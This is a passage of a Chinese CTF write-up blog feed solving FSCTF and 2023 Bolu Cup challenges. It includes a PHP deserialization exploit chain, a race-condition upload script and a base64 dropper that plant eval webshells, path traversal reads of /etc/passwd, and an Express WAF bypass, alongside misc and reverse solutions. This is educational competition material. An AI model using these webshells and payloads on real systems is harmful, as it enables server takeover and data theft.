data-num=\"70\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">start2</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"11111\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">start1</span><span class=\"token operator\">-></span><span class=\"token function\">Love</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">start</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You are Good!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Ha_rde_r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Ha_rde_r'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"You are Silly goose!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>exp:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">Rd</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ending</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cl</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$poc</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Poc</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$payload</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$fun</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Er</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$symbol</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$Flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Ha</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Ha</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">start2</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"11111\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">start1</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Rd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">start</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'POC'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'1111'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">start1</span> <span class=\"token operator\">-></span><span class=\"token property\">cl</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Er</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">//$a -> start1 ->cl -> Flag = \"ls /\";</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">start1</span> <span class=\"token operator\">-></span><span class=\"token property\">cl</span> <span class=\"token operator\">-></span> <span class=\"token property\">Flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cat /flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h3 id=\"加速加速\"><a class=\"anchor\" href=\"#加速加速\">#</a> 加速加速</h3>\n<p>这道题就是一个条件竞争 网上搜 upload-labs 通关甚至你能直接搜到 exp</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTMzNjg1\">《Web 安全系列》- 文件上传 - 条件竞争上传 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<p>这题就是在上传文件时如果你上传的不是图片 过 0.5 秒 (很好跑出来的) 就会给你删掉。</p>\n<p>这题目的就是在删掉之前访问你上传的 webshell (所以要你加速快过删除速度)</p>\n<p>两种方法，一种是用 burpsuit 发两个包，一种是直接写脚本通过，贴一下官方脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># coding:utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> concurrent<span class=\"token punctuation\">.</span>futures <span class=\"token keyword\">import</span> ThreadPoolExecutor</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">td</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> url <span class=\"token operator\">=</span> <span class=\"token string\">'http://xxxx/index.php'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> files <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token string\">'puu.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]);?>' ); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'submit'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'上传'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> re <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'http://xxxx/upload/puu.php'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">if</span> re<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'上传成功'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token keyword\">with</span> ThreadPoolExecutor<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> p<span class=\"token punctuation\">.</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>td<span class=\"token punctuation\">,</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>还有就是使用 bp：</p>\n<p>首先上传 jinzheng.php，使用 bp 截包：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"shell.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">,</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>发给 intruder 模块，清除 $，在选项中设置线程数为 20，并设置载荷为空，且无限期重复：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/11.png\" alt=\"11\" /></p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/12.png\" alt=\"12\" /></p>\n<p>然后就是访问 jinzheng.php 文件，首先得知道文件路径，随便上传一个图片，就知道上传文件都在 /upload 目录下。</p>\n<p>同样发给 intruder 模块，同样按照上述设置</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/13.png\" alt=\"\" /></p>\n<p>这时候两者发起攻击，在访问 jinzheng.php 界面可以看到一个 200 的状态码，说明 jinzheng.php 上传成功，并成功执行生成 shell.php 文件。然后你就可以用蚁剑连接 /upload/shell.php 目录，密码是 a。</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"为什么不换换思路捏\"><a class=\"anchor\" href=\"#为什么不换换思路捏\">#</a> 为什么不换换思路捏</h3>\n<p>打开附件看到密文：</p>\n<blockquote>\n<p>密文：3956305A7652305877676D656E3532626F395664776B3358723557596F52335835423055375A4556444E6C52</p>\n</blockquote>\n<p>典型的 16 进制，转为字符串：</p>\n<blockquote>\n<p>9V0ZvR0Xwgmen52bo9Vdwk3Xr5WYoR3X5B0U7ZEVDNlR</p>\n</blockquote>\n<p>接下来就交给 ciphey 就可以了：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/9.png\" alt=\"6\" /></p>\n<h3 id=\"base套\"><a class=\"anchor\" href=\"#base套\">#</a> base 套</h3>\n<p>附件：</p>\n<blockquote>\n<p>flag 如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如是 ZmxhZ+WmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguWmguaYr1pteGhaK1dtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1V21ndVdtZ3VXbWd1YVlyMXB0ZUdoYUsxZHRaM1ZYYldkMVYyMW5kVmR0WjNWWGJXZDFWMjFuZFZkdFozVlhiV2QxVjIxb......</p>\n</blockquote>\n<p>后面还有一大串，思路就是删除 'flag 如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如是 ' 后 base64 解密，然后再删除 'flag 如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如如是 ' 进行 base64 解密，以此类推，直到出现 flag。</p>\n<h2 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"mine-sweeper\"><a class=\"anchor\" href=\"#mine-sweeper\">#</a> MINE SWEEPER</h3>\n<p>用 32 位 IDA 反汇编后，在源码中看到：</p>\n<blockquote>\n<p>puts(&quot;FSCTF{We1C0m3 t0 rev w0r1d!!!}&quot;);</p>\n</blockquote>\n<h3 id=\"signin\"><a class=\"anchor\" href=\"#signin\">#</a> signin</h3>\n<p>upx 脱壳后，看到 main 函数里：</p>\n<pre><code class=\"language-c++\">_main();\n  std::allocator&lt;char&gt;::allocator(&amp;v8);\n  std::string::string(v7, &quot;FSCTF&#123;1t_15_re4lly_0bv10u5_t0_f1nd&#125;&quot;, &amp;v8);\n  std::allocator&lt;char&gt;::~allocator(&amp;v8);\n  v3 = std::operator&lt;&lt;&lt;char&gt;(refptr__ZSt4cout, v7);\n  ((void (__fastcall *)(__int64))refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_)(v3);\n  for ( i = 0; ; ++i )\n  &#123;\n    v5 = i;\n    if ( v5 &gt;= std::string::length((std::string *)v7) )\n      break;\n    v4 = *(char *)std::string::operator[](v7, i);\n    if ( v4 == 49 )\n    &#123;\n      *(_BYTE *)std::string::operator[](v7, i) = 105;\n    &#125;\n    else if ( v4 &gt; 49 )\n    &#123;\n      if ( v4 == 52 )\n      &#123;\n        *(_BYTE *)std::string::operator[](v7, i) = 97;\n      &#125;\n      else if ( v4 == 53 )\n      &#123;\n        *(_BYTE *)std::string::operator[](v7, i) = 115;\n      &#125;\n    &#125;\n    else if ( v4 == 48 )\n    &#123;\n      *(_BYTE *)std::string::operator[](v7, i) = 111;\n    &#125;\n  &#125;\n  getchar();\n  std::string::~string((std::string *)v7);\n  return 0;\n</code></pre>\n<p>在循环内部，它检查当前字符 <code>v4</code>  的值，如果是 '1'，则将其替换为 'i'，如果是 '4'，则替换为 'a'，如果是 '5'，则替换为's'，如果是 '0'，则替换为 'o'。这是一种字符替换操作。</p>\n<p>执行题目的 exe 文件：</p>\n<p 1t_15_re4lly_0bv10u5_t0_f1nd=\"\">FSCTF</p>\n<p>把数字改下就是 flag。</p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/SP811/",
            "url": "https://p1kap1.github.io/CTF/web/SP811/",
            "title": "2023柏鹭杯-wp",
            "date_published": "2023-10-16T16:00:00.000Z",
            "content_html": "<h2 id=\"签到\"><a class=\"anchor\" href=\"#签到\">#</a> 签到</h2>\n<p>下载好文件打开后是一大堆空格，把第一行当成字符 'f'，空格数目加减当成 ascii 码加减，在第一行基础上得到后续字符：</p>\n<p ISEC-eF8x2Bv1viw9eFvagivx0Ynv3jlai0vL=\"\">flag</p>\n<h2 id=\"express-fs\"><a class=\"anchor\" href=\"#express-fs\">#</a> express fs</h2>\n<blockquote>\n<p>题目描述：获取 flag</p>\n</blockquote>\n<p>进入题目是个精美的界面</p>\n<blockquote>\n<h5 id=\"welcome-to-meiya-pico-ctf\"><a class=\"anchor\" href=\"#welcome-to-meiya-pico-ctf\">#</a> Welcome to MeiYa Pico CTF !</h5>\n</blockquote>\n<p>点击 start exploring, 进入一个空白界面，但是发现导航栏已经变了：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzguMTMwLjExNi4yNjoxMjE4MC8/ZmlsZT1jaGVjay5odG1s\">http://8.130.116.26:12180/?file=check.html</span></p>\n</blockquote>\n<p>题目是 express web 框架，那就深入 node 的 fs 中去探索。</p>\n<p>发送 get 请求查询  <code>?file=/etc/passwd</code>  可以访问任意文件，但 waf 禁掉了  <code>flag</code>  字符串。</p>\n<p>那就利用 Express 对查询参数的处理来构造一个精心设计的对象来绕过</p>\n<p>payload:</p>\n<p>/?file[href]=b&amp;file[origin]=8&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fl%2561g.txt</p>\n<h2 id=\"综合题5\"><a class=\"anchor\" href=\"#综合题5\">#</a> 综合题 5</h2>\n<blockquote>\n<p>题目描述：小明用 spring boot 做了一个 java 文件的上传功能 demo，放到了 /app/ 下。（注：综合题 6、7 均为此题环境）</p>\n</blockquote>\n<p>打开后是一个文件上传界面，上传一个文件后，再尝试 view，发现把刚才上传的文件重新下载了回来。</p>\n<p>检查网页源代码发现：</p>\n<p>window.location.href = '/readfile?filename=' + data.filename;</p>\n<p>访问 /readfile?filename=/etc/passwd</p>\n<p>没反应，可能是受限于当前目录的原因，那就用目录穿越试试</p>\n<p>/readfile?filename=../../../../../../etc/passwd</p>\n<p>发现下载成功，想到题目提到 /app/ 下面的文件，使用 /readfile?filename=../../../../../../proc/self/cmdline，</p>\n<p>下载到</p>\n<blockquote>\n<p>java -jar /app/demo.jar --spring.config.location=/usr/local/share/application.properties</p>\n</blockquote>\n<p>下载 /app/demo.jar 文件：</p>\n<p>/readfile?filename=../../../../../../app/demo.jar</p>\n<p>打开 Upload.class 文件后发现这两个变量：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> enc_flag1 <span class=\"token operator\">=</span> <span class=\"token string\">\"UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">O0O</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"6925cc02789c1d2552b71acc4a2d48fd\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>如果不出意外 flag 就在这里，</p>\n<p>下面有个加密函数：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">o0o</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token class-name\">Ooo</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">StringBuilder</span> oOo <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">int</span> o0O <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token constant\">OO0</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Ooo</span><span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> o0O <span class=\"token operator\">&lt;</span> <span class=\"token constant\">OO0</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>o0O<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">char</span> <span class=\"token class-name\">Oo0</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Ooo</span><span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>o0O<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">char</span> oOO <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token constant\">O0O</span><span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>o0O <span class=\"token operator\">%</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token constant\">O0O</span><span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">char</span> <span class=\"token class-name\">OOo</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Oo0</span> <span class=\"token operator\">^</span> oOO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            oOo<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OOo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getEncoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>oOo<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>具体来说，这个方法做了以下工作：</p>\n<ol>\n<li>创建一个名为  <code>oOo</code>  的  <code>StringBuilder</code> ，用于构建加密后的字符串。</li>\n<li>使用  <code>for</code>  循环遍历输入字符串  <code>Ooo</code>  中的每个字符。</li>\n<li>对于每个字符  <code>Oo0</code> ，它会取出一个密钥字符  <code>oOO</code> ，该密钥字符是通过使用  <code>this.O0O</code>  字段中的字符（按顺序循环）获得的。</li>\n<li>使用按位异或运算符  <code>^</code>  对输入字符  <code>Oo0</code>  和密钥字符  <code>oOO</code>  进行异或操作，以加密字符。</li>\n<li>加密后的字符  <code>OOo</code>  被追加到  <code>oOo</code>  中。</li>\n<li>最后，将  <code>oOo</code>  中的字符转换为字节数组，然后使用 Base64 编码器将字节数组编码为字符串，并返回这个编码后的字符串。</li>\n</ol>\n<p>不出意外我们输入的值就是 flag，写个脚本来计算下输入的值：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>encrypted_string <span class=\"token operator\">=</span> <span class=\"token string\">\"UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token string\">\"6925cc02789c1d2552b71acc4a2d48fd\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># Base64 解码</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>decoded_bytes <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>encrypted_string<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 